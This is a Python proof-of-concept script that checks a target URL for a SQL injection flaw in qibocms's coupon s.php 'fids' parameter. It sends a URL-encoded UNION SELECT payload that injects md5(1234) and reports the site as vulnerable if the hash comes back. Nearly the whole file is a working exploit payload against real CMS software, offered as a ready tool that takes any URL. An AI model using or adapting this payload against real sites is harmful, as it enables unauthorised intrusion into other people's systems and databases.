#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20UnIoN%20SeLeCt%20Md5(1234),2,3,4,5,6,7,8,9%23"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="存在qibocms s.php文件参数fids SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
